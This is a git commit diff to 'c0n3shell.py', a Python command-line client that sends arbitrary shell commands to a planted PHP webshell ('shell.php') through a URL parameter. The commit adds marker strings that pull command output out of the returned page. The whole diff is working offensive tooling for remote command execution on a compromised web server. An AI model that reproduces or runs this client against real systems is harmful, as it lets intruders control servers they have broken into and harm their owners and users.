f0f708d959f24aae62311bb78180d85fcdcd269b
Lrk <sfxelrick@gmail.com>
2019-10-23 17:35:45 +0200

    Add simple marker detection for extracting result from pages content

--- c0n3shell.py
+++ c0n3shell.py
@@ -27,7 +27,9 @@ class C0n3Shell(Cmd):
         'url': 'http://localhost/shell.php',
         'attribute':'cmd',
         'raw': False,
-        'show_stderr':True
+        'show_stderr':True,
+        'pwd':'',
+        'marker':'[c3n0]'
     }
 
     def __init__(
@@ -53,13 +55,16 @@ class C0n3Shell(Cmd):
         self.banner()
         Cmd.__init__(self)
         self.showOptions(None)
+        self.getPwd()
+
+    def default(self,args):
+        self.cmdHandler(args)
 
     def banner(self):
         print(BANNER)
         print('')
 
     def cmdHandler(self,cmd):
-
         if cmd != None and len(cmd)>0 and cmd.startswith('!'):
             # internal commands
             cmdArray = cmd.split(' ')
@@ -70,52 +75,66 @@ class C0n3Shell(Cmd):
             else:
                 print('[!] Unknown {}'.format(internal_command_handler))
         else:
-            self.sendToShell(cmd)
+            print(self.sendToShell(cmd))
 
-    def helpCmd(args):
-        print('[?] Help: ')
-
+    # Send command to webshell and display results
     def sendToShell(self,cmd):
         payload = cmd
 
         try:
             if self._options['show_stderr']:
                 payload = '{} 2>&1'.format(payload)
+            if not self._options['raw']:
+                payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'],payload,self._options['marker'])
 
-            print('[!] Sending payload: {}'.format(payload))
+            print('[>] Sending payload: {}'.format(payload))
             response = requests.request(
                 self._http_verb,
                 '{}?{}={}'.format(self._options['url'],self._options['attribute'],quote(payload)),
                 headers=self._headers,
                 data=self._data if self._http_verb in ['post,put'] else None
                 )
-            # if self._options['raw']:
-            print(response.text)
-            # else:
+            if response.status_code == 200:
+                if self._options['raw']:
+                    return response.text
+                else:
+                    result = response.text
+                    try:
+                        if result != None and len(result)>0:
+                            result = result[result.find(self._options['marker'])+len(self._options['marker'])+1:]
+                            result = result[:result.find(self._options['marker'])]
+                        return result
+                    except:
+                        return response.text
+            else:
+                print('[!] Receive http code {}: {}').format(response.status_code,response.text)
+
 
         except Exception as ex:
             print('[!] Error: {}'.format(ex))
-
-    # Send command to webshell and display results
-    def default(self,args):
-        self.cmdHandler(args)
 
     def setOptions(self,args):
         try:
             args = args.split(' ')
             self._options[args[0]] = args[1]
-            print('[V] {}: {}'.format(args[0],args[1]))
+            print('[>] {}: {}'.format(args[0],args[1]))
         except Exception as ex:
             print('[!] Error: {}'.format(ex))
-            print('[!] Usage: set option value')
+            print('[>] Usage: set option value')
 
     def showOptions(self,args):
-        print('[!] options:')
+        print('[>] options:')
         for name, value in self._options.items():
             print("\t{}: {}".format(name,value))
 
+    def getPwd(self):
+        return ''
+
     def quitCmd(self,args):
         quit()
+
+    def helpCmd(args):
+        print('[?] Help: ')
 
     _internal_commands = {
         'help': helpCmd,
